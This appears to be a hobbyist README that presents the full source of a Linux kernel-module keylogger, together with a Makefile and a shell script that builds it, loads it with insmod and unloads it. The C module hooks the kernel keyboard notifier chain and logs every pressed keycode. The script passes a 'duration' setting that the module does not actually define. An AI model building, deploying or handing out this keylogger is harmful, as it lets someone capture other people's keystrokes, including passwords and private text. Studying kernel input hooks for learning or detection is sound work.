

# Dead Mans Lever
```sh
# dead_mans_handle.sh 
# in case of some loop or error, this script will handle unloading the module as i had to reboot many times within the dev phrase of this.
# it should now work at least okay-adjacent.

sudo dmesg -C
make clean
sleep 1
make 
sleep 1
sudo insmod lkm.ko duration="10" # the duration of th keylogger, in seconds. If duration=15, it will run(spy on keyboard) for 15 seconds before quitting.
sleep 5
sudo dmesg
sudo rmmod lkm.ko
sudo dmesg
```


# Makefile
```makefile
obj-m += lkm.o

all:
	sudo dmesg -C
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	sudo dmesg -C
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

# LKM Key-Logger
```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h> // The subsystem we are hooking into
#include <linux/input.h>

// This function is called by the OS every time a key is processed
static int keyboard_event_handler(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    // We only care about actual physical key presses (KBD_KEYCODE)
    if (code == KBD_KEYCODE) {
        // param->down is 1 for press, 0 for release
        if (param->down) {
            // param->value gives us the standard Linux keycode (not the raw scancode)
            pr_info("spy: Keycode %i pressed\n", param->value);
        }
    }
    
    // NOTIFY_OK tells the kernel to let the key press continue normally to the OS.
    // If we returned NOTIFY_STOP, we could selectively block keys.
    return NOTIFY_OK; 
}

// Set up the structure to register our handler
static struct notifier_block keysniffer_blk = {
    .notifier_call = keyboard_event_handler
};

static int __init spy_init(void) {
    // Hook into the notification chain
    register_keyboard_notifier(&keysniffer_blk);
    pr_info("spy: Notifier active. Listening cleanly.\n");
    return 0;
}

static void __exit spy_exit(void) {
    // Unhook from the chain
    unregister_keyboard_notifier(&keysniffer_blk);
    pr_info("spy: Notifier removed.\n");
}

module_init(spy_init);
module_exit(spy_exit);
MODULE_LICENSE("GPL");
```


